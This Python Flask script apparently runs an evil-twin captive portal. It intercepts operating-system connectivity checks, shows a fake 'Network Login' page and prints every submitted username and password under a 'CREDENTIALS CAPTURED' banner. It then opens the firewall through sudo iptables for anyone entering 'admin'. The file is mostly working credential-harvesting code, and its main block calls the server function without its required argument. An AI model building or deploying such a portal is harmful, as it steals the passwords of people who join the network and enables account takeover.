import subprocess
from flask import Flask, request, redirect

app = Flask(__name__)

# ==============================================================================
# 1. THE USER INTERFACE (HTML/CSS embedded directly in your Python code)
# ==============================================================================
LOGIN_PAGE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Network Authentication</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; text-align: center; padding: 50px; }
        .login-box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); display: inline-block; width: 300px; }
        input[type="text"], input[type="password"] { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { background-color: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; width: 96%; font-size: 16px; }
        button:hover { background-color: #0056b3; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Network Login</h2>
        <p>Please log in to access the internet.</p>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Username" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Connect to Internet</button>
        </form>
    </div>
</body>
</html>
"""

# ==============================================================================
# 2. HELPER FUNCTION (To fetch hardware address for the firewall)
# ==============================================================================
def get_mac_from_ip(ip):
    """ Reads the Linux ARP cache to match the user's IP to their physical MAC address """
    try:
        with open("/proc/net/arp", "r") as f:
            for line in f.readlines()[1:]: # Skip the headers
                parts = line.split()
                if parts[0] == ip:
                    return parts[3]
    except Exception as e:
        print(f"[-] Failed to read ARP table: {e}")
    return None
# ==============================================================================
# 3. CAPTIVE PORTAL DETECTION TRAPS
# ==============================================================================

# THE HOME BASE: This is the only place that actually hands out the HTML interface.
@app.route('/')
@app.route('/index.html')
def index():
    return LOGIN_PAGE_HTML, 200


# THE INTERCEPTION TRAPS: Instead of serving HTML here, we bounce the device to '/'
@app.route('/generate_204')          # Android / Google
@app.route('/hotspot-detect.html')   # Apple iOS/macOS
@app.route('/library/test/success.html')
@app.route('/connecttest.txt')       # Windows 10/11
@app.route('/ncsi.txt')              # Windows Legacy
def captive_traps():
    # A 302 redirect makes the tablet realize it's explicitly being handled by a gateway,
    # which wakes up the native automatic popup assistant.
    #return redirect('/')
    # Force a fresh redirect down to the base landing page
    response = redirect('http://192.168.1.1:5000/') # Use your AP gateway IP here
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response


# Catch-all route for any other random background URL the device hits
@app.errorhandler(404)
def page_not_found(e):
    return redirect('http://192.168.1.1:5000/')
    

# ==============================================================================
# 4. WEB ROUTING AND FIREWALL CONTROL
# ==============================================================================


@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    client_ip = request.remote_addr 

    EV_INTERFACE = app.config.get('EV_INTERFACE', 'wlxe84e06aed7c3')

    # --------------------------------------------------------------------------
    # MONITOR USER INPUT
    # --------------------------------------------------------------------------
    print("\n" + "!"*50)
    print(f"🚨 CREDENTIALS CAPTURED FROM {client_ip}")
    print(f"👤 USERNAME: {username}")
    print(f"🔑 PASSWORD: {password}")
    print("!"*50 )

    # --------------------------------------------------------------------------
    # AUTHENTICATION & INTERNET PROVISIONING
    # --------------------------------------------------------------------------
    if username == "admin":
        user_mac = get_mac_from_ip(client_ip) 
        
        if user_mac:
            try:
                # 1. Insert exception at the very top (-I) of the NAT PREROUTING chain.
                # This tells Linux: "If traffic matches this MAC, skip the REDIRECT trap entirely."
                nat_cmd = [
                    "sudo", "iptables", "-t", "nat", "-I", "PREROUTING", 
                    "-i", EV_INTERFACE, "-m", "mac", "--mac-source", user_mac, 
                    "-j", "ACCEPT"
                ]
                subprocess.run(nat_cmd, check=True)
                
                # 2. Insert exception at the top of the FORWARD chain.
                # This explicitly lets their packets pass through to the real internet interface.
                forward_cmd = [
                    "sudo", "iptables", "-I", "FORWARD", 
                    "-i", EV_INTERFACE, "-m", "mac", "--mac-source", user_mac, 
                    "-j", "ACCEPT"
                ]
                subprocess.run(forward_cmd, check=True)
                
                print(f"[+] Internet access granted to MAC: {user_mac}")
                return "<h1>Success! You are now connected to the internet.</h1>"
                
            except subprocess.CalledProcessError as e:
                return f"Internal error executing firewall update: {e}", 500
        else:
            return "Unable to determine your physical network address. Please disconnect and try again.", 400
            
    return "Invalid credentials. Please go back and try again.", 401
    
    

# ==============================================================================
# 5. START THE SERVER
# ==============================================================================

def run_flask_server(interface_name):
    """Function to start the Flask application. 
    This blocks, so it must be run inside a thread."""
    # Use 'werkzeug' logging tweaks if you want to suppress standard request spam
    #import logging
    #log = logging.getLogger('werkzeug')
    #log.setLevel(logging.ERROR) 
    """Function to start the Flask application inside a thread."""
    
    # Save the interface to Flask's internal configuration dictionary
    app.config['EV_INTERFACE'] = interface_name
    # Run the server on port 5000 across all interfaces
    app.run(host='0.0.0.0', port=5000, threaded=True, use_reloader=False)

if __name__ == '__main__':
    
    # Listens on all local network interfaces on port 5000
    run_flask_server()